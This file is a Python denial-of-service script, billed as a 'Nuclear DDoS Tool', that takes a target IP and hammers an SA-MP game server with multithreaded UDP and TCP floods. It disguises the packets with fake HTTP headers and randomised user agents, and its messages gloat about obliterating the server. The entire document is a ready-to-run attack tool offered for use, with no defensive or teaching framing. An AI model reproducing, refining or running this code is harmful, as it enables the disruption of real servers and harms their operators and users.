import socket
import threading
import random
import time
import argparse
from faker import Faker
import os

# Initialize Faker for generating fake headers
fake = Faker()

# Parse command-line arguments for customizable attack
parser = argparse.ArgumentParser(description="Nuclear DDoS Tool for SA-MP Server Annihilation on Windows")
parser.add_argument("--ip", required=True, help="Target SA-MP server IP")
parser.add_argument("--port", type=int, default=7777, help="Target server port (default: 7777)")
parser.add_argument("--threads", type=int, default=400, help="Number of attack threads (400 for Windows stability)")
parser.add_argument("--duration", type=int, default=120, help="Attack duration in seconds")
parser.add_argument("--intensity", type=int, default=3072, help="Packet size in bytes (3072 for heavy damage)")
args = parser.parse_args()

target_ip = args.ip
target_port = args.port
num_threads = args.threads
attack_duration = args.duration
packet_size = args.intensity

# Semaphore to prevent Windows resource exhaustion
semaphore = threading.Semaphore(800)

def generate_samp_payload():
    """Generate a fake SA-MP packet to mimic legitimate traffic"""
    payload = random._urandom(packet_size)
    fake_header = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {fake.user_agent()}\r\nConnection: keep-alive\r\n\r\n".encode()
    return payload + fake_header

def udp_nuke():
    """UDP flood to choke server bandwidth"""
    with semaphore:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + attack_duration
        while time.time() < end_time:
            try:
                payload = generate_samp_payload()
                sock.sendto(payload, (target_ip, target_port))
                print(f"[NUKE] Smashing {target_ip}:{target_port} with {len(payload)} bytes of chaos!")
            except:
                sock.close()
                break
        sock.close()

def tcp_nuke():
    """TCP flood to exhaust server connections"""
    with semaphore:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        end_time = time.time() + attack_duration
        while time.time() < end_time:
            try:
                sock.connect((target_ip, target_port))
                sock.send(generate_samp_payload())
                print(f"[NUKE] TCP missile launched at {target_ip}:{target_port}!")
            except:
                sock.close()
                break
        sock.close()

def main():
    os.system("cls" if os.name =="nt" else"clear")  # Clear Windows terminal
    print(f"Deploying nuclear DDoS strike on {target_ip}:{target_port} for {attack_duration} seconds! 😈")
    threads = []
    # Spawn UDP threads
    for i in range(num_threads // 2):
        thread = threading.Thread(target=udp_nuke)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    # Spawn TCP threads
    for i in range(num_threads // 2):
        thread = threading.Thread(target=tcp_nuke)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    # Sustain the attack
    try:
        time.sleep(attack_duration)
        print("Nuclear strike complete. The server is fucking obliterated. 😈")
    except KeyboardInterrupt:
        print("Attack halted. Chaos takes a breather... but it’s ready to strike again. 😈")

if __name__ == "__main__":
    main()
